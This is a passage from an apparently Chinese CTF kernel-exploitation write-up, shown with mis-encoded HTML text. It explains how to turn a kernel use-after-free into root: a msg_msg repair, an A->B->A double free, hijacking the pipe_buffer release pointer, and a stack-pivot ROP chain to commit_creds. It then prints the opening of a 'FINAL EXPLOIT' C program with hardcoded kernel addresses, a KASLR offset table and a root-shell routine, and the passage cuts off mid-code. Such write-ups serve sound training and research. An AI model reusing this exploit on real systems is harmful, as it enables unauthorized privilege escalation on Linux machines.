A-&gt;B-&gt;A å¼ freelist åŠ«æŒæ–°çš„ç»“æ„ä½“</h3><p>ç°åœ¨åœ°å€æ³„éœ²çš„å·¥ä½œå·²ç»å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥è€ƒè™‘å¦‚ä½•è¿›è¡Œææƒï¼Œæ¯”è¾ƒæœ´ç´ çš„ææƒæ–¹æ³•æœ‰ä¸¤ç§ï¼šä¿®æ”¹è¿›ç¨‹ cred ç»“æ„ä½“æˆ–æ˜¯åŠ«æŒå†…æ ¸æ‰§è¡Œæµ</p><p>å¯¹äºå‰ä¸€ç§æ–¹æ³•æˆ‘ä»¬éœ€è¦è·å¾—å†…æ ¸ä¸­çš„ä»»æ„åœ°å€å†™ï¼Œå¯èƒ½æ­¤æ—¶æœ‰çš„åŒå­¦å·²ç»æƒ³åˆ°äº†åˆ©ç”¨ userfaultfd + msg_msg è¿™ä¸€ä»»æ„å†™æ–¹æ³•ï¼Œè€Œç°åœ¨æˆ‘ä»¬æœ‰ç€å†…å­˜æœç´¢æŠ€æœ¯ï¼Œè‡ªç„¶å¯ä»¥ç›´æ¥ä½¿ç”¨ prctl è®¾ç½® task_struct çš„ comm æˆå‘˜åè¿›è¡Œæš´åŠ›æœç´¢ï¼Œä½†é¦–å…ˆ<strong>æˆ‘ä»¬å¹¶ä¸çŸ¥é“ PCB åœ°å€åœ¨å½“å‰å·²çŸ¥å †åœ°å€çš„å‰æ–¹è¿˜æ˜¯åæ–¹</strong>ï¼Œæ— è®ºæœç´¢å‰å‘è¶Šç•Œè¿˜æ˜¯åå‘è¶Šç•Œåˆ°äº†éæ³•åœ°å€éƒ½ä¼šå¼•èµ· kernel panicï¼Œä¸”è‡ªå†…æ ¸ç‰ˆæœ¬ 5.11 èµ· <strong>userfaultfd ç³»ç»Ÿè°ƒç”¨è¢«é™åˆ¶ä¸º root æƒé™æ‰èƒ½ä½¿ç”¨</strong>ï¼Œå› æ­¤ç¬”è€…é€‰æ‹©æ§åˆ¶ä¸€äº›æœ‰ç€å‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ä»è€ŒåŠ«æŒå†…æ ¸æ‰§è¡Œæµ</p><p>é‚£ä¹ˆæˆ‘ä»¬è¦å°†è¯¥ object åˆ†é…åˆ°åˆ«çš„åœ°æ–¹ï¼Œè¿˜è¦èƒ½å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬<strong>å¿…é¡»è¦å…ˆå°†è¯¥ object æ”¾å› slub ä¸­</strong>ï¼Œå› ä¸ºæ­¤æ—¶è¯¥ object è™½ä¸º free çŠ¶æ€ï¼Œä½†å½“æˆ‘ä»¬å°†å…¶åˆ†é…åˆ°åˆ«çš„ç»“æ„ä½“ä¸Šå<strong>æˆ‘ä»¬ä¾¿æ— æ³•å†æ§åˆ¶å…¶å†…å®¹</strong>ï¼Œå› ä¸ºæ­¤æ—¶åŸ msg_msg ç»“æ„ä½“çš„æ•°æ®ä¼šè¢«æ–°ç»“æ„ä½“è¦†ç›–ï¼Œ<strong>æ— æ³•æ­£å¸¸è¢«é‡Šæ”¾</strong>ï¼ˆè¿‡ä¸äº† msgrcv ä¸­çš„ unlinkï¼‰</p><p>å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬çš„å·¥ä½œä¾¿æ˜¯å…ˆç»´ä¿® msg_msg ä¸­çš„åŒå‘é“¾è¡¨ï¼Œè®©å…¶æŒ‡å‘å†…æ ¸å †ä¸Šä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼ŒåŒæ—¶è®© next æŒ‡é’ˆä¸º NULL å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€‰æ‹©ä½¿ç”¨ setxattr å®Œæˆä¿®å¤ï¼Œå¯èƒ½æœ‰çš„åŒå­¦è¿™é‡Œä¼šæœ‰ç–‘é—®ï¼šm_list æˆå‘˜ä½äº msg_msg çš„å‰ 16 å­—èŠ‚ï¼Œåœ¨ setxattr å°†å…¶æ”¾å› slub æ—¶<strong>éš¾é“ä¸ä¼šåˆå°†å…¶ä¿®æ”¹ä¸ºä¸€ä¸ª slub ä¸­çš„æŒ‡é’ˆä»è€Œç ´ååŒå‘é“¾è¡¨ä¹ˆ</strong>ï¼Ÿå¼€å¯äº† hardened freelist ä¿æŠ¤æ—¶ free object çš„ next æŒ‡é’ˆå­—é¢é‡å¹¶éä¸€ä¸ªåˆæ³•åœ°å€ã€‚è¿™é‡Œæˆ‘ä»¬å°±è¦è¯´åˆ° slub çš„ä¸€ä¸ªç‰¹æ€§äº†ï¼š</p><ul><li>ä¸åŒäº glibc ä¸­ç©ºé—²å †å—å›ºå®šä½¿ç”¨å‰ 8 å­—èŠ‚çš„ç»„ç»‡æ–¹å¼ï¼Œåœ¨ slub ä¸­ç©ºé—²çš„ object åœ¨å…¶å¯¹åº”çš„ kmem_cache-&gt;offset å¤„å­˜æ”¾ä¸‹ä¸€ä¸ª free object çš„æŒ‡é’ˆï¼ˆå¼€å¯äº† hardened freelist ä¿æŠ¤æ—¶è¯¥å€¼ä¸ºå½“å‰ object ä¸ ä¸‹ä¸€ä¸ª object åœ°å€å†ä¸ä¸€ä¸ª random å€¼æ€»å…±ä¸‰ä¸ªå€¼è¿›è¡Œå¼‚æˆ–çš„ç»“æœï¼‰</li></ul><p>ç»ç¬”è€…å¤šæ¬¡æµ‹è¯•ï¼Œå¯¹äºè¿™ç§è¾ƒå¤§çš„ object è€Œè¨€ï¼Œå…¶ offset é€šå¸¸ä¼šå¤§äº msg_msg header çš„å¤§å°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œå®Œç¾ä¿®å¤</p><p>ä¿®å¤å®Œæˆä¹‹åæˆ‘ä»¬è€ƒè™‘å¦‚ä½•è¿›è¡Œ double freeï¼Œå› ä¸º slub çš„é‡Šæ”¾å‡½æ•°å¹¶æ²¡æœ‰å¤ªå¤šçš„ä¿æŠ¤ï¼Œå¦‚åŒ glibc ä¸­çš„ fastbin ä¸€èˆ¬åªä¼šæ£€æŸ¥ freelist ä¸Šçš„ç¬¬ä¸€ä¸ª objectï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åƒåšç”¨æˆ·æ€ pwn é¢˜é‚£æ ·æ„é€  A-&gt;B-&gt;A çš„é‡Šæ”¾é“¾ä¾¿èƒ½å°† UAF å†åº”ç”¨åˆ°å…¶ä»–å†…æ ¸ç»“æ„ä½“ä¸Š</p><h3 id="Step-IV-pipe-buffer-åŠ«æŒ-RIP">Step.IV pipe_buffer åŠ«æŒ RIP</h3><p>æœ€åæˆ‘ä»¬æ¥æŒ‘é€‰ä¸€ä¸ªå†…æ ¸ç»“æ„ä½“æ¥åŠ«æŒ RIPï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©äº† <code>pipe_buffer</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„è¯¥ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è€Œå½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åŠ«æŒå…¶å‡½æ•°è¡¨å³å¯ï¼ŒåŠ«æŒçš„ä½ç½®ä¹Ÿå¾ˆæ¸…æ™°ï¼šå‰é¢æˆ‘ä»¬åœ¨æœç´¢å†…å­˜æ—¶è·å–åˆ°äº†å…¶ä¸­ä¸€ä¸ª msg_msg çš„åœ°å€ï¼Œåªéœ€è¦å‡å»å…¶ä¸è¢«ç”¨äº UAF çš„ object çš„åœ°å€ä¹‹é—´çš„åç§»å³å¯ï¼Œè¿™ä¸ªåç§»å€¼åœ¨æœç´¢è¿‡ç¨‹ä¸­æ˜¯å¯ä»¥è®¡ç®—å‡ºæ¥çš„</p><p>ä¹‹åæˆ‘ä»¬å°†å‡½æ•°è¡¨åŠ«æŒåˆ° pipe_buffer æ‰€å¤„ object ä¸Šï¼Œåœ¨è¯¥ object ä¸Šå¸ƒç½®å¥½ ROP é“¾ï¼Œå†é€‰ä¸€æ¡åˆé€‚çš„ç”¨äºæ ˆè¿ç§»çš„ gadget å³å¯</p><p>ç»ç¬”è€…å®æµ‹ï¼Œæ­¤æ—¶çš„ rsi å¯„å­˜å™¨æŒ‡å‘ pipe_bufferï¼Œå› æ­¤ç¬”è€…é€‰æ‹©äº†ä¸€æ¡ <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> çš„ gadget å®Œæˆæ ˆè¿ç§»</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><h3 id="FINAL-EXPLOIT">FINAL EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_ADD     0x1234</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_EDIT    0x4321</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_SHOW 0xbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_DEL     0xdead</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000040</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><span class="hljs-type">size_t</span> kernel_offset, kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;<br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], pipe_fd2[<span class="hljs-number">2</span>], pipe_fd_1;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">kernelLeakQuery</span><span class="hljs-params">(<span class="hljs-type">size_t</span> kernel_text_leak)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">switch</span> (kernel_text_leak &amp; <span class="hljs-number">0xfff</span>)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x6e9</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff812b76e9</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x980</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82101980</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x440</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82e77440</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xde7</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82411de7</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x4f0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff817894f0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xc90</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff833fac90</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x785</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff823c3785</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x990</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810b2990</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x900</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82e49900</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x8b4</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8111b8b4</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xc40</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8204ac40</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x320</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8155c320</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xee0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810d6ee0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x5e0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810e55e0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xe80</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82f05e80</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x260</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82ec0260</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] fill up your dict!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((kernel_offset % <span class="hljs-number">0x100000</span>) != <span class="hljs-number">0</span>) <span class="hljs-comment">// miss hit?</span><br>        kernel_offset = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">return</span> kernel_offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_ADD);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_DEL);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat /flag;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">long</span> mtype;<br>        <span class="hljs-type">char</span> mtext[<span class="hljs-number">1</span>];<br>&#125;msg;<br> <br> <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span 